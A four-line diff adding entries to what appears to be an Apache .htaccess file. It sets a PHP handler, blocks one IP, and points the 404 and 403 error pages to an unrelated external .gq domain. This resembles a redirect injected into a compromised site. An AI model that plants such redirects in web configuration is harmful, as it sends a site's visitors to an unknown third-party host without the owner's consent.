@@ -1,0 +1,4 @@
+AddType application/x-httpd-php56 .php
+deny from 141.101.76.207
+ErrorDocument 404 http://finalzz.gq/404/
+ErrorDocument 403 http://finalzz.gq/403/
